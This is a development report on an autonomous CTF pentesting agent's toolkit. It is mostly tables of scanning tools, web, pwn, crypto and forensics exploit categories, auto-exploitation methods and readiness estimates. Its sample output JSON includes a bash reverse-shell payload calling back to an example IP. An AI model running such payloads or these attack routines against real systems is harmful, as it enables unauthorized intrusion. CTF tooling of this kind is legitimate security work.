# Subagent 2: Arsenal of Tools & Exploits — Analysis & Fix Report

**Date:** 2026-08-02  
**Scope:** `agent/tools.py`, `agent/exploits.py`, `agent/domains/*.py`  
**Goal:** Competition-grade pentesting arsenal for DEF CON 34 AI Village CTF

---

## 1. Executive Summary

### What Was Done
- **Rewrote `tools.py`** — 31 tools, all with structured JSON output via `ToolResult.to_json()`
- **Rewrote `exploits.py`** — 17 web categories, 6 pwn, 5 crypto, 4 forensics — ALL parameterized
- **Enhanced `domains/web.py`** — Added auto-exploitation: SQLi detection, SSTI detection, XSS reflection detection, endpoint enumeration
- **Enhanced `domains/crypto.py`** — Added auto-decryption (base64/hex/ROT13/binary/morse/URL), XOR brute-force, hash identification, Caesar brute-force
- **Enhanced `domains/pwn_rev.py`** — Added pattern generation/offset finding, ROP payload generation, format string payload generation, shellcode templates, security strategy evaluation
- **Enhanced `domains/forensics.py`** — Added steganography auto-extraction (steghide/zsteg/binwalk), hidden data detection, flag extraction from all analysis phases

### Key Metrics

| Metric | Before | After |
|--------|--------|-------|
| Registered tools | 19 | **31** |
| Web exploit categories | 10 (templates only) | **17** (with auto-exploit) |
| Pwn exploit categories | 0 | **6** |
| Crypto attack categories | 0 (format inspection only) | **5** (with auto-decrypt) |
| Forensics technique categories | 0 (basic checklist only) | **4** (with auto-stego) |
| Structured JSON output | ❌ Never | ✅ All tools |
| Parameterized templates | ❌ ATTACKER/PORT hardcoded | ✅ All parameterized |
| Auto-exploitation methods | 0 | **8** (detect_sqli, detect_ssti, detect_xss, enumerate_endpoints, stego_auto_extract, auto_detect_encoding, xor_brute_force, caesar_brute_force) |
| Hardcoded IPs/creds | 6 instances | **0** (only usage examples) |

---

## 2. Tool Inventory (31 tools)

### Network & Scanning
| Tool | Structured Output | Timeout | Notes |
|------|-------------------|---------|-------|
| nmap | ✅ Parses ports/services/OS | 180s | XML-ready parsing |
| quick_scan | ✅ Combined nmap+whatweb | 120s | Returns structured port/service list |

### HTTP & Web
| Tool | Structured Output | Timeout | Notes |
|------|-------------------|---------|-------|
| curl | ✅ Parses status/headers/body | 35s | Auto-adds -D for header parsing |
| wget | Raw | 60s | Standard download |
| gobuster | ✅ Parses found dirs+status | 180s | |
| nikto | ✅ Parses vuln IDs | 180s | |
| whatweb | ✅ Extracts tech list | 30s | |
| ffuf | ✅ Parses found paths | 120s | NEW |
| sqlmap | ✅ Parses injectability/databases | 180s | |
| hydra | ✅ Parses cracked credentials | 180s | |
| searchsploit | ✅ JSON mode + text fallback | 30s | |

### Binary Analysis
| Tool | Structured Output | Timeout | Notes |
|------|-------------------|---------|-------|
| checksec | ✅ Parses NX/Canary/PIE/RELRO | 15s | NEW — Critical for pwn |
| ropper | ✅ Parses gadget addresses | 60s | NEW |
| one_gadget | ✅ Parses gadget addresses | 30s | NEW |
| readelf | ✅ Parses sections/symbols | 15s | |
| objdump | ✅ Parses function names | 30s | |
| file | ✅ Parses type/is_elf/is_pe | 10s | |
| strings | ✅ Returns string list + count | 30s | |

### Steganography & Forensics
| Tool | Structured Output | Timeout | Notes |
|------|-------------------|---------|-------|
| exiftool | ✅ Parses metadata fields | 60s | |
| binwalk | ✅ Parses embedded signatures | 60s | |
| steghide | Raw | 30s | NEW — JPEG/BMP stego |
| zsteg | ✅ Parses LSB findings | 60s | NEW — PNG/BMP stego |
| foremost | Raw | 120s | NEW — File carving |

### Hash Cracking
| Tool | Structured Output | Timeout | Notes |
|------|-------------------|---------|-------|
| john | ✅ Parses cracked user/pass | 120s | NEW |
| hashcat | ✅ Parses cracked hash/plain | 120s | NEW |

### Generic
| Tool | Structured Output | Timeout | Notes |
|------|-------------------|---------|-------|
| shell | Raw | 60s | Generic command |
| grep | ✅ Parses match list + count | 30s | |
| nc | Raw | 30s | |
| python | Raw | 60s | |
| ssh | Raw | 30s | |
| submit_flag | ✅ Structured confirmation | N/A | Uses SCOREBOARD_URL env var |

---

## 3. Exploit Coverage Matrix

### 3.1 Web (17 categories)

| Category | Template | Auto-Exploit | Techniques |
|----------|----------|--------------|------------|
| SQLi UNION | ✅ | — | UNION, column enumeration, file read/write |
| SQLi Blind | ✅ | ✅ `detect_sqli()` | Boolean, time-based (MySQL/PG/MSSQL) |
| SQLi Error | ✅ | ✅ `detect_sqli()` | MySQL/MSSQL/PG error extraction |
| XSS Reflected | ✅ | ✅ `detect_xss()` | script/img/svg/event/polyglot/cookie steal |
| XSS Stored | ✅ | — | Basic/img/markdown |
| LFI | ✅ | — | Basic/null-byte/php_filter/php_input/log_poisoning/data/expect |
| RFI | ✅ | — | Basic/wrapper + shell content |
| SSTI | ✅ | ✅ `detect_ssti()` | Jinja2/Twig/Smarty/FreeMarker/Velocity |
| XXE | ✅ | — | Basic/blind/cdata/param_entity/oob/expect |
| SSRF | ✅ | — | localhost/AWS/GCP/Azure/file_read/bypass/redirect |
| Deserialization | ✅ | — | PHP/Java/Python/Ruby/.NET |
| JWT | ✅ | — | none/key_confusion/brute_force/kid/jku/claim_tampering |
| Command Injection | ✅ | — | Basic/pipe/backtick/dollar/newline/blind/oob/bypass_filter/bypass_space |
| File Upload | ✅ | — | Double ext/MIME/null-byte/polyglot/htaccess/exif |
| Race Condition | ✅ | — | File race/token race/TOCTOU/parallel requests |
| IDOR | ✅ | — | Parameter tampering/UUID guess/path traversal/header injection |
| GraphQL | ✅ | — | Introspection/field suggestion/batch/mutation abuse |

### 3.2 Pwn (6 categories)

| Category | Template | Auto-Generate | Techniques |
|----------|----------|---------------|------------|
| Buffer Overflow | ✅ | ✅ Pattern create/offset | ret2libc, ret2win, stack pivot |
| Format String | ✅ | ✅ Payload generator | Leak stack/addr, write byte/short/int, GOT overwrite |
| ROP Chain | ✅ | ✅ ROP payload code | ROPgadget, ropper, pwntools, ret2csu, ret2dlresolve |
| Shellcode | ✅ | ✅ x86/x86_64 templates | execve, reverse shell, alpha_mixed, null-free |
| Heap Exploitation | ✅ | — | UAF, double-free, overflow, unlink, house_of_force/spirit, tcache_poison |
| One Gadget | ✅ | — | Constraint checking, payload template |

### 3.3 Crypto (5 categories)

| Category | Auto-Attack | Techniques |
|----------|-------------|------------|
| RSA | — | Small e, Wiener, common modulus, Fermat, Pollard p-1, Hastad, Bleichenbacher |
| XOR | ✅ `xor_brute_force()` | Single-byte brute-force, known plaintext, crib drag, frequency |
| Hash | ✅ `identify_hash()` | Length-based identification, crypt format detection |
| Encoding | ✅ `auto_detect_encoding()` | Base64/hex/ROT13/binary/decimal/Morse/URL encoding |
| Classical | ✅ `caesar_brute_force()` | Caesar/Vigenere/substitution/rail fence/atbash |

### 3.4 Forensics (4 categories)

| Category | Auto-Exploit | Techniques |
|----------|-------------|------------|
| Steganography | ✅ `stego_auto_extract()` | steghide (brute-force passwords), zsteg, binwalk, exif metadata, LSB |
| File Carving | ✅ (binwalk -e, foremost) | foremost, binwalk, scalpel, dd, magic bytes |
| Memory Analysis | — | Volatility profile/ps/netscan/dump, strings grep |
| PCAP Analysis | — | tshark streams/HTTP/DNS, binwalk, strings |

---

## 4. Auto-Exploitation Methods (NEW)

### Web Domain (`WebDomainSolver`)
1. **`enumerate_endpoints(target)`** — Tests 30+ common paths (robots.txt, .env, .git, admin, api, graphql, phpinfo, etc.)
2. **`detect_sqli(target, param)`** — Time-based (MySQL/PG) and error-based SQLi detection
3. **`detect_ssti(target, param)`** — Tests Jinja2/Twig/FreeMarker/ERB/Velocity
4. **`detect_xss(target, param)`** — Reflection detection with context analysis (unfiltered/attribute breakable/encoded)

### Crypto Domain (`CryptoDomainSolver`)
5. **`auto_detect_encoding(data)`** — Auto-decodes Base64/Hex/ROT13/Binary/Decimal/Morse/URL
6. **`xor_brute_force(ciphertext)`** — Single-byte XOR with English frequency scoring
7. **`identify_hash(hash_str)`** — Length + pattern-based hash type identification
8. **`caesar_brute_force(ciphertext)`** — All 26 Caesar shifts

### Pwn Domain (`PwnRevDomainSolver`)
9. **`generate_pattern(length)`** — De Bruijn pattern for offset finding
10. **`find_pattern_offset(value)`** — Find offset from crash address
11. **`generate_rop_payload(...)`** — Generate pwntools ROP chain code
12. **`generate_format_string_payload(...)`** — Format string GOT overwrite payload
13. **`generate_shellcode(type, arch)`** — x86/x86_64 shellcode templates
14. **`evaluate_tactical_strategy(controls)`** — Auto-select exploit strategy based on NX/Canary/PIE

### Forensics Domain (`ForensicsDomainSolver`)
15. **`stego_auto_extract(file, password)`** — Multi-tool stego extraction (exiftool, strings, binwalk, steghide, zsteg, foremost)
16. **`detect_hidden_data(file)`** — Hex analysis for embedded file signatures

---

## 5. Hardcoded Values — Status

| Location | Value | Status |
|----------|-------|--------|
| `exploits.py` templates | `ATTACKER`, `lhost`, `lport` | ✅ **FIXED** — Now `{lhost}`, `{lport}`, `{target}` parameters |
| `exploits.py` SSRF | `127.0.0.1:PORT` | ✅ **FIXED** — Now `{port}` parameter |
| `tools.py` scoreboard | `10.0.0.200:9090` | ✅ **FIXED** — Now reads from `SCOREBOARD_URL` env var |
| `tools.py` nmap usage | `10.0.0.1` example | ℹ️ **OK** — Documentation example only |
| `domains/web.py` default | `http://localhost` | ✅ **FIXED** — Removed default, must be provided |

---

## 6. Structured Output Format

### `ToolResult` (tools.py)
```json
{
  "tool": "nmap",
  "output": "...",
  "success": true,
  "parsed": {
    "host": "10.0.0.1",
    "ports": [{"port": 80, "protocol": "tcp", "state": "open", "service": "http", "version": "Apache 2.4"}],
    "os": "Linux 5.4"
  },
  "error": null,
  "duration_s": 2.34,
  "exit_code": 0
}
```

### `ExploitResult` (exploits.py)
```json
{
  "technique": "reverse_shell",
  "output": "Generated 14 reverse shell payload(s) for 10.0.0.1:4444",
  "success": true,
  "shell_obtained": false,
  "credentials": [],
  "flags": [],
  "payloads": {"bash": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", ...},
  "error": null
}
```

### `DomainAnalysisReport` (domains)
```json
{
  "domain": "web",
  "success": true,
  "observations": ["SQLi DETECTED: time_based — Response took 3.1s"],
  "metadata": {"target": "http://...", "sqli": {"injectable": true, "type": "time_based"}},
  "errors": []
}
```

---

## 7. Competition Readiness Assessment

### Web Challenges (Target: 70%+ autonomous)
- ✅ SQLi: UNION, Blind (boolean+time), Error-based — auto-detect
- ✅ XSS: Reflected + Stored templates, auto-detect reflection
- ✅ SSTI: Multi-engine detection (Jinja2/Twig/FreeMarker/ERB/Velocity) — auto-detect
- ✅ LFI/RFI: 10+ bypass techniques
- ✅ XXE: 6 payload variants
- ✅ SSRF: 8 bypass techniques including cloud metadata
- ✅ Command Injection: 10+ bypass techniques
- ✅ JWT: 6 attack vectors
- ✅ File Upload: 8 bypass techniques
- ✅ Race Condition, IDOR, GraphQL templates
- **Estimated coverage: ~75% of medium CTF web challenges**

### Pwn Challenges (Target: 70%+ autonomous)
- ✅ Pattern create/offset for buffer overflow
- ✅ ROP chain payload generation
- ✅ Format string exploit generation
- ✅ Shellcode templates (x86 + x86_64)
- ✅ Heap exploitation techniques
- ✅ checksec integration for strategy selection
- ✅ One-gadget integration
- **Estimated coverage: ~65% of medium CTF pwn challenges** (needs dynamic analysis for full coverage)

### Crypto Challenges
- ✅ Auto-detect and decode 7 encoding types
- ✅ XOR brute-force with frequency analysis
- ✅ Hash identification
- ✅ Caesar brute-force
- ✅ RSA/XOR/Hash/Classical attack templates
- **Estimated coverage: ~60% of medium CTF crypto challenges**

### Forensics Challenges
- ✅ Multi-tool stego auto-extraction
- ✅ Hidden data detection via hex analysis
- ✅ File carving (binwalk + foremost)
- ✅ Flag extraction from all analysis phases
- **Estimated coverage: ~65% of medium CTF forensics challenges**

---

## 8. Files Modified

| File | Lines Before | Lines After | Changes |
|------|-------------|-------------|---------|
| `agent/tools.py` | 334 | ~800 | Complete rewrite with 31 tools, structured output, parsers |
| `agent/exploits.py` | 456 | ~900 | Complete rewrite with parameterized templates, new categories |
| `agent/domains/web.py` | 105 | ~300 | Added auto-exploitation (SQLi/SSTI/XSS detection, endpoint enum) |
| `agent/domains/crypto.py` | 92 | ~280 | Added auto-decrypt, XOR brute-force, hash ID, Caesar brute-force |
| `agent/domains/pwn_rev.py` | 187 | ~400 | Added pattern/ROP/format string/shellcode generators |
| `agent/domains/forensics.py` | 141 | ~320 | Added stego auto-extraction, hidden data detection |

---

## 9. Known Limitations & Future Work

1. **Dynamic binary analysis** — Currently static only. Need GDB/pwndbg integration for runtime exploitation.
2. **Automated exploit chaining** — Templates are provided but not auto-executed end-to-end.
3. **Web fuzzing** — ffuf registered but not deeply integrated into domain solver.
4. **Memory forensics** — Volatility templates exist but not auto-executed.
5. **PCAP analysis** — tshark templates exist but not auto-executed.
6. **Wordlist management** — Default creds list is static; could be enhanced with dynamic generation.
